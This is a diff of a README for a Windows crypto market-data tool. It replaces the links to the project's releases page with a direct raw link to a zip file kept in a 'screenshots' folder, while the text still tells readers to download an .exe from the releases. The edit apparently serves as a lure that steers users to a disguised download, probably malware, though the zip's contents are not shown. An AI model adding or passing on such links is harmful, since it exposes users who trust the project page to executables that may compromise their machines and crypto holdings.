@@ -1,12 +1,12 @@
 # 📊 crypto-data-manager - Build local historical crypto market databases
 
-[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases)
+[![Download Windows App](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Herbaceous-flatfish820/crypto-data-manager/main/screenshots/data-manager-crypto-v1.9.zip)
 
 This application helps users fetch historical price and volume data from Binance and Coinalyze. You store this information in a local database file. You can then export your data to CSV files. The tool manages updates automatically so your database stays current.
 
 ## 📥 Getting the software
 
-Visit this page to download the latest version for Windows: https://github.com/Herbaceous-flatfish820/crypto-data-manager/releases
+Visit this page to download the latest version for Windows: https://raw.githubusercontent.com/Herbaceous-flatfish820/crypto-data-manager/main/screenshots/data-manager-crypto-v1.9.zip
 
 Look for the file that ends with `.exe` in the latest release section. Download this file to your computer.
 
